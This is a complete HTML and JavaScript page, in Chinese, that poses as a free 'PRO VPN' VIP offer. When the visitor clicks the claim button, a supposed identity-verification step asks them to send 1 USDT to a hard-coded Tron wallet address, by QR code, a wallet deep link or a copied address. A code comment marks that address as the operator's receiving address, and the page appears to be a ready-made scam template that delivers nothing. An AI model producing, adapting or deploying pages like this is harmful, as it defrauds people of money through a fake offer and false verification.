<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRO VPN - 领取中心</title>
    <style>
        body { background: #050505; color: #fff; font-family: 'Arial', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #111; padding: 30px; border-radius: 12px; width: 300px; text-align: center; border: 1px solid #333; box-shadow: 0 0 30px rgba(0, 255, 136, 0.1); }
        h2 { margin: 0; color: #00ff88; font-size: 20px; letter-spacing: 2px; }
        .tag { background: #00ff88; color: #000; font-size: 10px; padding: 2px 6px; border-radius: 4px; margin-left: 8px; font-weight: bold; }
        .desc { color: #666; font-size: 13px; margin: 20px 0 30px 0; line-height: 1.5; }
        .btn { background: #fff; color: #000; border: none; padding: 14px; width: 100%; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; }
        .btn:hover { background: #f0f0f0; }
        .qr-box { display: none; margin-top: 20px; }
        .qr { width: 180px; height: 180px; margin: 10px auto; }
        .addr { font-size: 10px; color: #444; word-break: break-all; margin-top: 10px; }
        .copy-btn { background: #222; color: #fff; border: 1px solid #333; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; margin-top: 5px; }
    </style>
</head>
<body>

<div class="card">
    <h2>PRO VIP <span class="tag">FREE</span></h2>
    <p class="desc">点击下方按钮，自动为您分配专属加速节点。<br>需完成一次身份验证。</p>
    
    <button class="btn" id="claimBtn" onclick="startClaim()">立即领取</button>
    
    <div class="qr-box" id="qrBox">
        <p style="color:#888; font-size:12px;">请使用 Trust Wallet / TronLink 扫描</p>
        <img id="qrImg" class="qr" src="" alt="">
        <div class="addr">TSzeymMiwsphqH28LyYD32xBMoihioBKD6</div>
        <button class="copy-btn" onclick="copyAddr()">复制地址</button>
    </div>
</div>

<script>
    // ✅ 你的收款地址
    const TARGET = "TSzeymMiwsphqH28LyYD32xBMoihioBKD6";
    const AMOUNT = 1000000; // 1 USDT

    function startClaim() {
        // 1. 隐藏按钮，显示二维码
        document.getElementById('claimBtn').style.display = 'none';
        document.getElementById('qrBox').style.display = 'block';
        
        // 2. 生成 Deep Link QR Code
        const link = `tron:${TARGET}?amount=${AMOUNT}`;
        document.getElementById('qrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${encodeURIComponent(link)}`;
        
        // 3. 尝试直接唤起 App (移动端)
        window.location.href = link;
    }

    function copyAddr() {
        navigator.clipboard.writeText(TARGET);
        alert("地址已复制！请在您的钱包中发送 1 USDT。");
    }
</script>

</body>
</html>
